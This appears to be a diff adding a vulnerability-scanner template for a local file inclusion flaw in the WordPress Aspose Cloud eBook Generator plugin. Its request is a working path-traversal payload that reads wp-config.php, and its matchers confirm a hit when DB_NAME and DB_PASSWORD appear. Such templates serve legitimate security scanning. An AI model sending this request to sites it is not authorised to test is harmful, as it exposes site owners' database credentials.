@@ -1,0 +1,34 @@
+id: "aspose-file-download"
+name: "Wordpress Aspose Cloud eBook Generator - Local File Inclusion"
+severity: "high"
+description: "Wordpress Aspose Cloud eBook Generator is vulnerable to local file inclusion."
+tech:
+  - "wordpress"
+  - "php"
+tags:
+  - "aspose"
+  - "ebook"
+  - "wpscan"
+  - "wordpress"
+  - "wp-plugin"
+  - "lfi"
+  - "vuln"
+reference: "https://wpscan.com/vulnerability/7866"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "DB_NAME"
+      - "DB_PASSWORD"
+    condition: "and"
+  - type: "status"
+    status:
+      - 200
